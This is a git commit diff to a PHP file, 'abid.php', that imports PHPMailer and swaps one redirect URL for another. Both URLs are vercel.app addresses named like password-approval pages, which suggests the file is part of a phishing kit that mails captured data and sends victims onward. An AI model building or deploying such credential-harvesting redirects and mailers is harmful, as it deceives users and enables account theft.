2ce4c0a080603c6bc3b3da4e01840efceff09cdc
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-20 11:43:36 +0500

    Update abid.php

--- abid.php
+++ abid.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://hus-re-pass-aprove.vercel.app/");
+header("Location: https://abi-pass-aproval-submit.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
